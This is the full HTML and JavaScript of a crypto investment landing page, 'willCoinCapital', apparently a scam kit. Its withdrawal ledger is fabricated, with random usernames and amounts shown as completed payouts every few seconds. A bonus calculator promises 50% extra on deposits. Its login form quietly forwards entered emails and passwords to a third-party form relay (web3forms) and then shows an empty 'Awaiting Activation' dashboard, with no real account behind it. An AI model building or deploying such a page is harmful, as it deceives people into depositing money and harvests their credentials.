<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>willCoinCapital | Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #020817; color: white; margin: 0; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .btn-glow { box-shadow: 0 0 20px rgba(34, 211, 238, 0.4); }
        .view-hidden { display: none !important; }
        
        /* Fixed Table for Mobile Alignment */
        table { table-layout: fixed; width: 100%; border-collapse: collapse; }
        th, td { overflow: hidden; white-space: nowrap; }
        th:first-child, td:first-child { padding-left: 1.5rem; }
        th:last-child, td:last-child { padding-right: 1.5rem; }
        
        /* Professional Currency Alignment & Glow */
        .currency-wrap { display: flex; align-items: baseline; justify-content: center; gap: 12px; }
        .currency-symbol { 
            font-size: 2rem; 
            font-weight: 800; 
            color: #22d3ee; 
            text-shadow: 0 0 10px rgba(34, 211, 238, 0.6);
        }

        input[type="range"] { -webkit-appearance: none; background: #1f2937; height: 4px; border-radius: 10px; width: 100%; }
        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: #22d3ee; cursor: pointer; }
        
        .support-float { position: fixed; bottom: 24px; right: 24px; z-index: 1000; }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .new-row { animation: slideIn 0.4s ease-out forwards; }
    </style>
</head>
<body>

    <a href="https://t.me/willCoin_Capital" target="_blank" class="support-float flex items-center gap-2 bg-cyan-400 text-black px-6 py-3 rounded-full font-black uppercase text-[9px] tracking-widest btn-glow">
        <span class="w-1.5 h-1.5 rounded-full bg-black animate-pulse"></span>
        Live Support
    </a>

    <div id="main-terminal">
        <nav class="flex items-center justify-between px-6 py-6">
            <div class="text-lg font-extrabold tracking-tighter">WILLCOIN<span class="text-cyan-400">CAPITAL</span></div>
            <div class="flex gap-4">
                <button onclick="toggleAuth('login')" class="text-[9px] font-bold uppercase tracking-widest text-gray-400">Login</button>
                <button onclick="toggleAuth('signup')" class="px-4 py-2 bg-cyan-400 text-black rounded-lg text-[9px] font-black uppercase tracking-widest btn-glow">Sign Up</button>
            </div>
        </nav>

        <main class="max-w-7xl mx-auto px-4 py-8 text-center">
            <h1 class="text-4xl font-extrabold mb-8 tracking-tighter uppercase leading-[1.1]">MAXIMIZE YOUR <br> CRYPTO POTENTIAL</h1>
            
            <div class="glass max-w-md mx-auto p-10 rounded-[40px] border border-white/5 relative mb-12">
                <div class="absolute top-0 right-0 bg-cyan-400 text-black text-[8px] font-bold px-3 py-1 rounded-bl-lg uppercase">Bonus Active: 50%</div>
                <h2 class="text-cyan-400 italic font-black uppercase text-[10px] mb-10 text-left tracking-widest">Profit Projection</h2>
                <div class="space-y-8">
                    <div class="bg-black/40 rounded-2xl p-6 border border-white/5 currency-wrap">
                        <span class="currency-symbol">$</span>
                        <input type="number" id="depositInput" value="1000" class="w-36 bg-transparent text-left text-5xl font-bold outline-none text-white tracking-tighter">
                    </div>
                    <input type="range" id="depositSlider" min="100" max="10000" step="100" value="1000">
                </div>
                <div class="flex justify-between mt-12 pt-8 border-t border-white/5">
                    <div class="text-center"><p class="text-[9px] text-gray-500 uppercase font-bold mb-1">Invest</p><p class="text-xl font-bold" id="displayInvest">$1,000</p></div>
                    <div class="text-center"><p class="text-[9px] text-cyan-400 uppercase font-bold mb-1">Bonus</p><p class="text-xl font-bold text-cyan-400" id="displayBonus">$500</p></div>
                    <div class="text-center"><p class="text-[9px] text-gray-500 uppercase font-bold mb-1">Total</p><p class="text-xl font-bold" id="displayTotal">$1,500</p></div>
                </div>
            </div>

            <section class="max-w-md mx-auto pb-12">
                <div class="flex items-center justify-center gap-2 mb-6">
                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                    <h3 class="text-xs font-black uppercase tracking-widest">Withdrawal Ledger</h3>
                </div>
                <div class="glass rounded-3xl overflow-hidden border border-white/5">
                    <table class="w-full text-left text-[11px]">
                        <thead class="bg-white/5 text-gray-500 uppercase font-bold">
                            <tr>
                                <th class="py-5 w-[32%]">User</th>
                                <th class="py-5 w-[33%]">Amount</th>
                                <th class="py-5 w-[35%] text-right">Status</th>
                            </tr>
                        </thead>
                        <tbody id="ledgerBody" class="divide-y divide-white/5"></tbody>
                    </table>
                </div>
            </section>
        </main>
    </div>

    <div id="dashboard" class="view-hidden min-h-screen bg-[#010409] p-6 text-center">
        <h2 class="text-cyan-400 font-black uppercase italic text-xl mb-8">Dashboard</h2>
        <div class="glass p-8 rounded-2xl"><p class="text-gray-400 text-sm">Awaiting Activation...</p></div>
        <button onclick="signOut()" class="mt-8 text-xs text-gray-500 underline uppercase tracking-widest font-bold">Sign Out</button>
    </div>

    <div id="authModal" class="fixed inset-0 z-[1100] flex items-center justify-center p-6 view-hidden">
        <div class="absolute inset-0 modal-bg" onclick="toggleAuth()"></div>
        <div class="glass max-w-sm w-full p-10 rounded-[40px] border border-cyan-400/30 relative z-10 text-center">
            <h2 id="authTitle" class="text-xl font-black uppercase text-cyan-400 mb-8">Login</h2>
            <form id="authForm" class="space-y-5">
                <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                <input type="email" name="email" placeholder="Email Address" required class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-sm outline-none">
                <input type="password" name="password" placeholder="Password" required class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-sm outline-none">
                <button type="submit" id="authSubmit" class="w-full py-5 bg-cyan-400 text-black font-black rounded-2xl uppercase text-[10px] btn-glow">Continue</button>
            </form>
        </div>
    </div>

    <script>
        // Persistence Logic
        if (localStorage.getItem('isLoggedIn') === 'true') { showDashboard(); }

        function showDashboard() {
            document.getElementById('main-terminal').classList.add('view-hidden');
            document.getElementById('dashboard').classList.remove('view-hidden');
            document.getElementById('authModal').classList.add('view-hidden');
            localStorage.setItem('isLoggedIn', 'true');
            window.scrollTo(0,0);
        }

        function signOut() { localStorage.removeItem('isLoggedIn'); location.reload(); }

        function toggleAuth(mode) {
            const modal = document.getElementById('authModal');
            if (!mode) { modal.classList.add('view-hidden'); return; }
            document.getElementById('authTitle').innerText = mode === 'login' ? 'Login' : 'Sign Up';
            modal.classList.remove('view-hidden');
        }

        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('authSubmit');
            btn.innerText = "Connecting...";
            try {
                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
                showDashboard();
            } catch(e) {
                btn.innerText = "Try Again";
            }
        };

        // Ledger Engine
        const users = ["Alpha_User", "0x4e...f2", "CryptoKing", "User_772", "Btc_Hunter", "0x9d...1a", "Whale_99", "Trader_X", "Elite_Node"];
        const ledgerBody = document.getElementById('ledgerBody');

        function updateLedger() {
            const user = users[Math.floor(Math.random() * users.length)];
            const amount = (Math.floor(Math.random() * 8000) + 500).toLocaleString();
            const row = document.createElement('tr');
            row.className = 'new-row';
            row.innerHTML = `
                <td class="py-5 text-gray-400 font-medium">${user}</td>
                <td class="py-5 font-bold text-white">$${amount}</td>
                <td class="py-5 text-right"><span class="bg-green-500/10 text-green-400 px-3 py-1.5 rounded-full text-[9px] font-black uppercase border border-green-500/20">Completed</span></td>
            `;
            ledgerBody.prepend(row);
            if (ledgerBody.children.length > 5) { ledgerBody.lastElementChild.remove(); }
        }

        for(let i=0; i<5; i++) { updateLedger(); }
        setInterval(updateLedger, 4000);

        // Slider Calculator
        const input = document.getElementById('depositInput');
        const slider = document.getElementById('depositSlider');
        function updateCalc(val) {
            document.getElementById('displayInvest').innerText = '$' + Number(val).toLocaleString();
            document.getElementById('displayBonus').innerText = '$' + (val * 0.5).toLocaleString();
            document.getElementById('displayTotal').innerText = '$' + (val * 1.5).toLocaleString();
        }
        input.oninput = (e) => { updateCalc(e.target.value); slider.value = e.target.value; };
        slider.oninput = (e) => { updateCalc(e.target.value); input.value = e.target.value; };
    </script>
</body>
</html>
